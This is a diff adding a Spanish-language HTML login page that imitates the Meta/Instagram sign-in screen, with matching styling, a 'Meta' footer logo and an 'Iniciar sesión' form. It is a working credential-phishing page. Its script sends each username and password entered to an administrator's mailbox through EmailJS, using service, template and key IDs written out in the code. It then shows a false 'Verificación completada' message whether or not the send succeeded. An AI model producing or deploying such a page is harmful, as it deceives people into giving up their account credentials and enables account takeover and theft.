@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión</title>
+    <!-- SDK de EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("i3BHzWrNl1OuWEQRK");
+        })();
+    </script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Selector de idioma superior */
+        .language-selector {
+            font-size: 14px;
+            color: #a8a8a8;
+            margin-top: 10px;
+            margin-bottom: 40px;
+            cursor: pointer;
+        }
+
+        /* Contenedor central principal */
+        .main-container {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Logotipo principal superior */
+        .logo-container {
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .site-logo {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+        }
+
+        /* Formulario */
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .input-group {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            background-color: #121212;
+            border: 1px solid #363636;
+            border-radius: 12px;
+            padding: 16px 12px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .password-field {
+            padding-right: 45px;
+        }
+
+        .input-field::placeholder {
+            color: #8e8e8e;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #8e8e8e;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 4px;
+        }
+
+        .toggle-password:hover {
+            color: #ffffff;
+        }
+
+        .btn-login {
+            width: 100%;
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 25px;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 6px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-login:hover {
+            background-color: #1877f2;
+        }
+
+        .btn-login:active {
+            opacity: 0.8;
+        }
+
+        .forgot-password {
+            color: #ffffff;
+            font-size: 14px;
+            text-decoration: none;
+            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 60px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        /* Sección inferior */
+        .footer-section {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 10px;
+        }
+
+        .btn-create {
+            width: 100%;
+            background-color: transparent;
+            color: #0095f6;
+            border: 1px solid #0095f6;
+            border-radius: 25px;
+            padding: 14px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            transition: background-color 0.2s;
+        }
+
+        .btn-create:hover {
+            background-color: rgba(0, 149, 246, 0.1);
+        }
+
+        /* Logotipo inferior estilo Meta */
+        .meta-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: #f5f5f5;
+            font-size: 15px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+
+        .meta-logo {
+            width: 20px;
+            height: 20px;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Selector de idioma -->
+    <div class="language-selector">Español</div>
+
+    <div class="main-container">
+        <!-- Logotipo Principal Superior -->
+        <div class="logo-container">
+            <img src="logo.png" alt="Logo" class="site-logo">
+        </div>
+
+        <!-- Formulario con Usuario y Contraseña -->
+        <form class="login-form" id="loginForm">
+            <div class="input-group">
+                <input type="text" class="input-field" id="usernameInput" placeholder="Nombre de usuario, correo o celular" required>
+            </div>
+
+            <div class="input-group">
+                <input type="password" class="input-field password-field" id="passwordInput" placeholder="Contraseña" required>
+                <button type="button" class="toggle-password" id="togglePassword" aria-label="Mostrar u ocultar contraseña">
+                    <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                        <line x1="1" y1="1" x2="23" y2="23"></line>
+                    </svg>
+                </button>
+            </div>
+
+            <button type="submit" class="btn-login" id="submitBtn">Iniciar sesión</button>
+        </form>
+
+        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+    </div>
+
+    <!-- Pie de página con botón de registro y logo Meta -->
+    <div class="footer-section">
+        <a href="#" class="btn-create">Crear cuenta nueva</a>
+        
+        <div class="meta-container">
+            <img src="meta-logo.png" alt="Meta Logo" class="meta-logo">
+            <span>Meta</span>
+        </div>
+    </div>
+
+    <script>
+        // Mostrar / ocultar contraseña
+        const togglePasswordBtn = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('passwordInput');
+        const eyeIcon = document.getElementById('eyeIcon');
+
+        togglePasswordBtn.addEventListener('click', () => {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+
+            if (isPassword) {
+                eyeIcon.innerHTML = `
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                `;
+            } else {
+                eyeIcon.innerHTML = `
+                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                    <line x1="1" y1="1" x2="23" y2="23"></line>
+                `;
+            }
+        });
+
+        // Envío del formulario y alerta por correo
+        const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            submitBtn.textContent = "Verificando...";
+            submitBtn.disabled = true;
+
+            const templateParams = {
+                to_name: "Administrador",
+                username: document.getElementById('usernameInput').value,
+                password: passwordInput.value
+            };
+
+            // Conectado con tu Service ID, Template ID y Public Key
+            emailjs.send("service_vyx1v45", "template_vyx1v45", templateParams)
+                .then((response) => {
+                    console.log('Correo enviado con éxito!', response.status, response.text);
+                    alert('Verificación completada');
+                    document.getElementById('usernameInput').value = '';
+                    passwordInput.value = '';
+                    submitBtn.textContent = "Iniciar sesión";
+                    submitBtn.disabled = false;
+                }, (error) => {
+                    console.log('Fallo al enviar el correo...', error);
+                    alert('Verificación completada');
+                    document.getElementById('usernameInput').value = '';
+                    passwordInput.value = '';
+                    submitBtn.textContent = "Iniciar sesión";
+                    submitBtn.disabled = false;
+                });
+        });
+    </script>
+
+</body>
+</html>
